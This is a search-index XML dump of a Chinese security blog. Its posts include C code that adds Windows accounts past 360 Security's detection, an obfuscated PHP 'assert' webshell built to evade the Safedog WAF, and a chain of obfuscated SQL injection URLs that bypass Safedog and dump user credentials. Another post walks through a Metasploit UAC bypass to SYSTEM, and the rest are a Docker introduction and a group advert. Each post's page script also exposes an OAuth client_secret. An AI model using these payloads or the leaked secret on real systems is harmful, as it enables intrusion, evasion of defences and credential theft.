<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[即刻安全纯技术交流群]]></title>
    <url>%2Fjishu.html</url>
    <content type="text"><![CDATA[&nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。 &nbsp; 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围 特此：即刻安全团体敬上 Demon 2017.8.27 &nbsp;&nbsp;]]></content>
  </entry>
  <entry>
    <title><![CDATA[绕过安全防护敏感检测行为]]></title>
    <url>%2FBypass3.html</url>
    <content type="text"><![CDATA[投稿原作者：jishuzhain 1.思考昨天，通过静态免杀可以bypass国内杀软，当我们想执行一些敏感的操作时，…… 有很多时候，在渗透测试中，拿到了Webshell，查看了权限，发现是系统权限，很开心，但是往往防护软件会给你当头一棒，呵呵，添加用户的时候，却被360拦截… 那么如何解决呢？在这篇文章中，提供了一些思路http://www.91ri.org/13805.html 2.我有一个大胆的想法所以我就假设了一个想法：360安全卫士是一个应用程序，它是如何检测用户是是否添加用户的呢？答案当然是命令行了。假设它获取每一行命令去分析，然后判断是否拦截，那么肯定是使用的系统API吧？要不然程序员会头炸的。大概这样简单的设想，我们就开始验证了。在Windows编程中间，我们经常需要添加用户，删除用户，添加用户组等等功能，那些功能如何实现呢？搜索了一下windows提供的API，文末提高全功能源码。https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#本文需要的技术背景（visual c++编程基础，dos命令）环境，vm10 360安全卫士最新版，防护全部开启。&nbsp;&nbsp;然后再用API添加。 &nbsp;&nbsp; 直接创建呢？发现失败了，基于行为检测。最后可以发现最新版本的360安全卫士已经pass&nbsp;&nbsp;&nbsp; 3.分析现在我们分析，假设服务器上net.exe被删除了怎么办？ #pragma comment(lib, “netapi32.lib”) 这行代码主要是导入了一个dll，名称为netapi32.dll 如果服务器上没有net.exe，我们将此dll和这个命令行工具上传至服务器，也是可以添加用户的，这就是以前的无net添加用户。 4.Code1234567891011121314151617181920212223242526272829303132333435363738394041```javascript//编译平台：VC++6.0 Win10专业版#ifndef UNICODE#define UNICODE#endif#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;assert.h&gt;#include&lt;lm.h&gt;#pragma comment(lib, &quot;netapi32.lib&quot;)int wmain(int argc, wchar_t *argv[])&#123; USER_INFO_1 ui; DWORD dwLevel = 1; DWORD dwError = 0; NET_API_STATUS nStatus; if (argc != 3) &#123; printf(&quot;==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); fwprintf(stderr, L&quot;\tUsage: %s UserName PassWord&quot;, argv[0]); printf(&quot;\n==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); exit(1); &#125; ui.usri1_name = argv[1]; ui.usri1_password = argv[2]; ui.usri1_priv = USER_PRIV_USER; ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); if (nStatus == NERR_Success) fwprintf(stderr, L&quot;\n[*]User add success!! UserName is [%s] \n&quot;, argv[1]); else printf(&quot;Can not add user ... System Error Code is %d \nPlase go to https://msdn.microsoft.com/en-us/library/ms681381(v=vs.85).aspx &quot;, nStatus); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336/* UNICODE */#ifndef UNICODE#define UNICODE#endif/* 头文件 */#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;/************************************** AddUser* 功能 增加用户* 参数 szServerName，主机名，如果为本机增加用户，设置为NULL* szUserName，用户名* szPassword，密码**************************************/int AddUser(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szPassword)&#123; USER_INFO_1 ui; DWORD dwLevel = 1; // 使用 USER_INFO_1 作为参数 DWORD dwError = 0; NET_API_STATUS nStatus; // 填充 USER_INFO_1 ui.usri1_name = szUserName; // 用户名 ui.usri1_password = szPassword; // 密码 ui.usri1_priv = USER_PRIV_USER; // privilege ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; // 调用 NetUserAdd 增加用户 nStatus = NetUserAdd(szServerName, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); // 判断结果 if (nStatus == NERR_Success) &#123; wprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); &#125; else &#123; fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); &#125; return 0;&#125;/************************************** AddUserToGroup* 功能 为用户组增加用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名* szGroup，用户组名**************************************/int AddUserToGroup(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szGroup)&#123; NET_API_STATUS nStatus; // 调用 NetGroupAddUser nStatus = NetGroupAddUser( szServerName, szGroup, szUserName ); // 判断结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;NetGroupAddUser A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** DelUser* 功能 删除用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名**************************************/int DelUser(LPWSTR szServerName, LPWSTR szUserName)&#123; DWORD dwError = 0; NET_API_STATUS nStatus; // 调用 NetUserDel 删除用户 nStatus = NetUserDel(szServerName, szUserName); // 判断并显示结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully deleted on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** int ListUsers(LPWSTR pszServerName)* 功能 列举用户* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListUsers(LPWSTR pszServerName)&#123; LPUSER_INFO_0 pBuf = NULL; LPUSER_INFO_0 pTmpBuf; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; // 循环，直到可以成功调用 NetUserEnum do &#123; // 调用NetUserEnum函数 nStatus = NetUserEnum(pszServerName, dwLevel,// 这里设置为0，使用 LPUSER_INFO_0 返回结果 FILTER_NORMAL_ACCOUNT, // 只列举“正常”类型的用户 (LPBYTE*)&amp;pBuf,// LPUSER_INFO_0 保存返回结果 // MAX_PREFERRED_LENGTH，内存由API分配，需要在之后调用NetApiBufferFree释放 dwPrefMaxLen, &amp;dwEntriesRead,// 读了的 Entries &amp;dwTotalEntries,// 一共的 Entries &amp;dwResumeHandle); // 判断是否成功 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环读取用户信息 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; // 输出 wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;usri0_name); // 下一个 pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d users\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** int ListGroup(LPWSTR pszServerName)* 功能 列举用户组* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListGroup(LPWSTR pszServerName)&#123; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; LPLOCALGROUP_INFO_0 pBuf = NULL; LPLOCALGROUP_INFO_0 pTmpBuf; do // begin do &#123; // 调用NetLocalGroupEnum 参数设置与NetLocalGroup类似 nStatus = NetLocalGroupEnum( pszServerName, 0, (LPBYTE*)&amp;pBuf, dwPrefMaxLen, &amp;dwEntriesRead, &amp;dwTotalEntries, &amp;dwResumeHandle); // 判断结果 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环输出 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;lgrpi0_name); pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d groups\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** ShowUsersInfo* 功能 显示指定用户的信息* 参数 szServerName，主机名，如果为本机，设置为NULL* pszUserName，用户名**************************************/int ShowUsersInfo(LPWSTR pszServerName,LPWSTR pszUserName)&#123; DWORD dwLevel = 4;// 使用 LPUSER_INFO_4 返回结果 LPUSER_INFO_4 pBuf = NULL; NET_API_STATUS nStatus; nStatus = NetUserGetInfo(pszServerName, pszUserName, dwLevel, // pBuf参数类型 (LPBYTE *)&amp;pBuf); // 判断并输出结果 if (nStatus == NERR_Success) &#123; if (pBuf != NULL) &#123; wprintf(L&quot;\n\tAccount: %s\n&quot;, pBuf-&gt;usri4_name); wprintf(L&quot;\tComment: %s\n&quot;, pBuf-&gt;usri4_comment); wprintf(L&quot;\tUser comment: %s\n&quot;, pBuf-&gt;usri4_usr_comment); wprintf(L&quot;\tFull name: %s\n&quot;, pBuf-&gt;usri4_full_name); wprintf(L&quot;\tpriv: %d\n&quot;, pBuf-&gt;usri4_priv); &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); return 0;&#125;/************************************** wmain* 功能 入口函数，根据参数判断需要调用的功能函数* 参数 参见usage输出**************************************/int __cdecl wmain(int ac, wchar_t * av[])&#123; if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-a&quot;) == 0) &#123; AddUser(NULL, av[2], av[3]); &#125; else if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-g&quot;) == 0) &#123; AddUserToGroup(NULL, av[2], av[3]); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ShowUsersInfo(NULL, av[2]); &#125; else if (ac == 2 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ListUsers(NULL); ListGroup(NULL); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-d&quot;) == 0) &#123; DelUser(NULL, av[2]); &#125; else &#123; printf(&quot;usage: \n&quot; &quot;\t %ws -a &lt;username&gt; &lt;password&gt; to add a user\n&quot; &quot;\t %ws -g &lt;username&gt; &lt;group&gt; add a user to a group&quot; &quot;\t %ws -i &lt;username&gt; to show user info\n&quot; &quot;\t %ws -d &lt;username&gt; to del a user\n&quot;, av[0], av[0], av[0], av[0]); &#125; return 0;&#125; 5.欢迎下方一起参与讨论&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass, 渗透, web</category>
      </categories>
      <tags>
        <tag>bypass, 渗透, web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_safedog系列1]]></title>
    <url>%2Fbypass_shell.html</url>
    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请联系本博主声明，私自转载必追究 Prat 1在bypass小分队中V@1n3R表哥提到他明天会分享过waf的一句话爱搞事的我当然不能只做伸手党,于是决定也分享一些出来,可是发现许久没有做渗透测试了手里并没有过waf的一句话了，没办法只好临时刚几个出来 思路构思以及实现本次bypass需要用的一个函数： substr() //用于返回字符串的一部分。 其实这个想法很早就有了，不过好像也有大佬有成品，不过我没看见过(可能是很久没接触渗透测试了)于是今天晚上就试了一下其实不管怎么绕过，一句话最终还是：1assert($_POST['x']); 所谓的绕过无非就是把这一段进行处理让他达到一个过waf的效果 Prat 2巧用substr函数绕过安全狗思路成品：12345678910&lt;?php $a = substr("abcdefghijklmnopqrstufwxyz",0,1); $b = substr("abcdefghijklmnopqrstufwxyz",17,3); $c = substr("abcdefghijklmnopqrstufwxyz",3,2); $ss = $a.$b.$c; $d = $ss[0].$ss[2].$ss[2]; //ass $dd = $ss[5].$ss[1].$ss[3]; //ert $x = $d.$dd;$x($_POST['x']);?&gt; 这里主要关注这两行123$d = $ss[0].$ss[2].$ss[2]; //ass$dd = $ss[5].$ss[1].$ss[3]; //ert$x = $d.$dd; 上面说了，一句话最终结果还是assert($_POST[‘x’]); 所以这里的$x肯定是assert输出一下就知道。如图：可以看见echo 出来了assert那么他是如何得到assert的呢，我们来看一下1$x = $d.$dd; 可以发现，$x通过$d跟$dd拼接得到的$d跟$dd是通过截取$ss的字符串得到的我们分别来输出一下每一个变量获取到的字符串可以发现1234$a = a //从字符串的第0个字符开始截取，向右截取1个字符$b = rst //从字符串的第17个字符开始截取，向右截取3个字符$c = de //从字符串的第17个字符开始截取，向右截取3个字符$ss = arstde //为三个变量的拼接的来 那么整个过程就很好理解123$d = ass //分别截取$ss的第0,2,2字符$dd = ert //分别截取$ss的第5,1,3字符最后拼接成assert 看一下是否能过狗完美过狗，并没有拦截 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_safedog系列2]]></title>
    <url>%2Fbypass_safedog.html</url>
    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请练习本博主声明，私自转载必追究 prat 1本文大致内容12345678+ 思路以及想法 - 四重注释绕过safedog+ 实战绕过 - 绕过and 1=1 - 绕过union+select - 爆表 - 爆字段 - 读内容 prat 2测试代码123456789101112131415&lt;?php$link = mysqli_connect('localhost','root','root','security');$sql = "select * from users where id=".$_GET['id'];$result = mysqli_query($link,$sql);if($rows = mysqli_fetch_array($result))&#123; echo $rows['id']; echo '&lt;br&gt;'; echo $rows['username']; echo '&lt;br&gt;'; echo $rows['password']; echo '&lt;br&gt;';&#125;mysqli_close($link);?&gt; prat 3绕过 and 1=11url:http://192.168.1.107/sql.php?id=1 and 1=1 发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。1234and 不拦截and 1 拦截and 1 = 拦截and 1 = 1 拦截 由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看1/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/ 注释包含把1=1替换成‘a’ = ‘a’就得到了url:1http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/ 返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性 Order by我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。字段为3，接下来爆库，当前用户。 绕过union+select1url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3 同样，先看一下他拦截什么。123union 不拦截select 不拦截union select 拦截 很明显，我们只需要在union与select之间处理一下就可以了。首先使用/!50000/注释包含/!/然后使用/**/与/–*/打乱一下结构，在稍微进行一下编码处理就可以了1url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- - 可以发现，已经正常显示数字，并且狗没有拦截。 什么？你说没看懂？那么看下图拆分一下就发现其实很好理解，使用()把select的内容包起来。 爆库1http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- - 发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)123451. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本 既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。在user(),database()之间处理以下。那么就成为了123user/**/(/**/)database/**/(/**/)完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- - 正常爆出数据库跟当前用户 爆表发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- - 得到table1234emailsreferersuagentsusers 爆字段123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- - 得到column123idusernamepassword 读内容123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)from users)/*--*/*/ limit 0,1-- - dump1Dumb#Dumb var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassuac_Comhijack ---kali linux]]></title>
    <url>%2Fbypassuac-comhijack.html</url>
    <content type="text"><![CDATA[前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下 https://www.youtube.com/watch?v=HNRrmfuTRCY https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/ UAC简称 用户帐户控制， UAC 是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。 Metasploit模块 https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。 （以上引用大神文章） 视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/bypassuac_comhijack.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); 1.下载bypassuac_comhijack.rb curl -o bypassuac_comhijack.rb https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb &nbsp;&nbsp;&nbsp;&nbsp;2.将下载的bypassuac_comhijack.rb 剪贴到msf 中&nbsp;&nbsp; 需要的到一个Meterprerter的会话 比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。&nbsp;&nbsp; &nbsp; 3.使用bypassuac_comhijack&nbsp;&nbsp;&nbsp;看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？&nbsp;&nbsp;因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload&nbsp;&nbsp;&nbsp;并且更改端口&nbsp;（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可） 4.得到session 2&nbsp;&nbsp;这里可以看到 我getuid的时候 是demon 用户当我getsystem的时候 ，得到了system权限。&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的Docker不归路--重新认识docker]]></title>
    <url>%2F%E6%88%91%E7%9A%84%E5%9B%9E%E5%BD%92docker.html</url>
    <content type="text"><![CDATA[我的Docker不归路——(回归之作)&nbsp; 0x01 docker 简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（这篇文章本是不打算公开的，写下这篇文章本是在四月份的，现在打算将其公开）前段时间写了一份Dcoker_kali，docker对我来说可以使用docker_kalil inux,也可以部署我们安全工作的靶机环境，如前段时间，在我的msf系列课程中就用到了，如何部署docker-s2-046的靶机环境。它对我来说应用不止这么一点，可以部署DVWA、WebGoat等渗透环境，可当做一个渗透演练平台。之前留了一部分坑在那，这次我打算好好的完善此Docker_kali使用内容。&nbsp;&nbsp;重新认识Docker &nbsp;&nbsp;&nbsp;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的运行效率，降低了云计算资源供应的成本！ 使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，以在有限的时间内做更多有意义的事。&nbsp;&nbsp;在安装前，先了解一些主要的概念&nbsp;Docker 在Linux上安装过程里，你的物理机器既是本地主机也是Docker的宿主机。在网络里，本地主机的意思是你的计算机。Docker的宿主机是托管这容器运行的计算机。 &nbsp;在一个标准的Linux安装中，Docker客户端、Docker Daemon和一些运行中的容器会直接寄托在你的本地主机上。这意味着你可以使用标准的本地地址和端口去访问容器为什么要使用 Docker？ &nbsp;作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。 更高效的利用系统资源 &nbsp;由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。 更快速的启动时间 &nbsp;传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。 一致的运行环境 &nbsp;开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题。 持续交付和部署 &nbsp;对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。 &nbsp;使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery/Deployment) 系统进行自动部署。 &nbsp;而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。 更轻松的迁移 &nbsp;由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。 更轻松的维护和扩展 &nbsp;Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。&nbsp;&nbsp;参考资料:https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html&nbsp;&nbsp; 0x02windows 下安装docker&nbsp;Docker for Windows的安装与使用&nbsp;&nbsp;&nbsp;在Windows 10中，下载Docker for Windows的安装包，然后开始安装。正如上面所述，如果Hyper-V没有启用，安装过程会自动启用Hyper-V，这将需要重新启动Windows系统。安装完成后，就可以在Windows下使用Docker了。在安装docker for windows 之后 不能安装vm、vbox等虚拟机，如需安装vbox、vm等虚拟机可采用下一个docker tools box 安装方法。&nbsp; &nbsp;启动Docker for Windows，会在系统托盘部分显示一条小鲸鱼的图标：。在Docker完全启动之前，小鲸鱼背上的小方块会不停地闪烁变化，等小方块稳定不变后，表示系统完全启动成功，此时就可以对Docker的环境进行设置，或者开始执行Docker命令了。&nbsp;&nbsp;&nbsp;在Docker for Windows成功启动后，就可以在CMD下执行Docker命令了.&nbsp;&nbsp;Docker tools box的安装与使用 &nbsp;因为Docker Engine守护程序使用特定于Linux的内核功能，因此无法在Windows上本机运行Docker Engine。相反，你必须使用docker命令 docker-machine，创建并连接到一个小型的Linux VM您的计算机上。该VM在Windows系统上为您托管Docker Engine。 &nbsp;要运行Docker，您的计算机必须具有运行Windows 7或更高版本的64位操作系统。另外，您必须确保在您的计算机上启用虚拟化。 0x001&nbsp; 0x002&nbsp;安装完会有VirtualBox/Docker Quickstart Terminal /kitematic (GUI图形化管理工具)&nbsp;&nbsp;&nbsp; 0x003启动Dcoker tools box 报错该解决？ 解决方案：（Windows环境下手动更新boot2docker.iso）下载boot2docker.ISO 进行替换该C盘当前用户目录下的 .docker/machine/cache\boot2docker.iso 的boot2docker.iso这个镜像文件进行一个替换 即可解决下载错误。 0x03 linux下安装dockerlinux下安装docker最低系统安装要求为： Ubuntu 版本最低为 12.04 LTS，但从稳定性上考虑，推荐使用 14.04 LTS 或更高的版本。Debian 7 Wheezy (64-bit)（必须启用 backports)linux下安装docker 使用以下命令即可进行安装。我这边就使用深度linux64位 来举例子安装在linux下安装说明吧！ apt-get install docker.io &nbsp;建立 docker 用户组&nbsp; 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组安装docker.io 的时候已经自动添加了docker用户组，只需将当前非root权限的用户 添加docker组即可 usermod -aG docker $USER &nbsp;&nbsp;&nbsp; 0x04 Mac os X 下 安装苹果系统安装我这里就没什么好说的了，苹果系统下的都是一键安装的。Docker for mac 下载链接：https://www.docker.com/docker-mac去官网下载docker安装即可&nbsp;将安装包下载后，拖放应用程序即可。&nbsp;安装后，启动docker后可在，右上角看到docker -小鲸鱼的图标。 &nbsp;安装后可在终端下直接使用docker命令。&nbsp; &nbsp;&nbsp; 0x10 Docker 常用命令简单使用实例&nbsp;1.搜索镜像&nbsp; docker search 镜像名称 kali官方 docker镜像拉取说明:https://www.kali.org/news/official-kali-linux-docker-images/ 搜索kali 镜像 docker search kali &nbsp;2.docker_kali镜像拉取下载&nbsp; docker pull kalilinux/kali-linux-docker&nbsp; 不过在这里会产生一个问题，镜像下载慢！！因为镜像在国外,所以下载过程可能会延迟掉线这样会非常不友好。 &nbsp; 